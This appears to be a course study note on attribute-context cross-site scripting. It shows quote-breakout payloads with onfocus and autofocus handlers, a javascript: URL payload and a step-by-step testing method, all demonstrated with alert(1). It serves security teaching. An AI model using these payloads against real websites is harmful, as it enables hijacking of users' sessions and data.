# XSS In HTML Tag Attributes

## Overview

Attribute Context XSS occurs when attacker-controlled data is reflected inside an HTML attribute.

Example:

```html
<input value="USER_INPUT">
```

---

# Why It Is Different

The payload is not placed into free HTML.

Instead, the attacker must:

```text
Break Attribute Context
        ↓
Inject New Attribute
        ↓
Trigger Event
```

---

# Example

Application Response:

```html
<input value="test">
```

---

Payload:

```html
" onfocus="alert(1)
```

---

Result:

```html
<input value=""
onfocus="alert(1)">
```

---

# Common Event Handlers

```html
onfocus
onclick
onmouseover
onmouseenter
onload
onerror
```

---

# Useful Attributes

## autofocus

```html
autofocus
```

Automatically focuses the element.

---

Example:

```html
" autofocus onfocus=alert(1) x="
```

---

# URL-Based Attributes

Examples:

```html
href
src
action
```

---

Payload:

```javascript
javascript:alert(1)
```

---

# Testing Methodology

```text
Locate Reflection
        ↓
Identify Attribute
        ↓
Break Context
        ↓
Inject Event Handler
        ↓
Trigger Execution
```

---

# Related Labs

- Lab15
- Lab16
- Lab17

---

# Related Theory

- 22-cross-site-scripting-contexts.md

---

# Key Takeaways

- Attribute Context requires breakout techniques.
- Event handlers are commonly abused.
- href attributes often allow javascript: payloads.
- Context identification remains critical.